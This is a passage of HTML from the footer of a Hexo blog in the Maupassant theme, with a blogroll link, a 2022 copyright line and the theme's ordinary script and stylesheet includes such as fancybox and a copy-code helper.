target="_blank">ziki</a><ul></ul><a href="https://blog.feldan.top/" title="feldan" target="_blank">feldan</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2022 <a href="/." rel="nofollow">Farmer.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.1.0" async></script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.1.0" async></script><link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.1.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.1.0"></script></div></body></html>
